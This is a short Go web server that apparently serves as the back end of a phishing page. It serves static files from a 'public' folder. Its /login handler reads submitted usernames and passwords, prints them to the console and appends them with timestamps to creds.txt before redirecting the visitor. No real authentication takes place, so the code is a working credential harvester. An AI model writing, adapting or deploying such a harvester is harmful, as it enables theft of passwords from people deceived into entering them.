package main

import (
	"fmt"
	"net/http"
	"time"
	"os"

	"github.com/gorilla/mux"
)

func login(w http.ResponseWriter, r *http.Request) {
	username := r.FormValue("_user")
	password := r.FormValue("_pass")
	fmt.Printf("Time: %s\n", time.Now().String())
	fmt.Printf("Username: %s\n", username)
	fmt.Printf("Password: %s\n", password)

	f, err := os.OpenFile("creds.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	defer f.Close()
	if err != nil {
		panic(err)
	}

	out := fmt.Sprintf("Time: %s, Username: %s, Password: %s\n", time.Now().String(), username, password)
	_, err = f.WriteString(out)

	http.Redirect(w, r, "/", 302)
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	http.ListenAndServe("127.0.0.1:8080", r)
}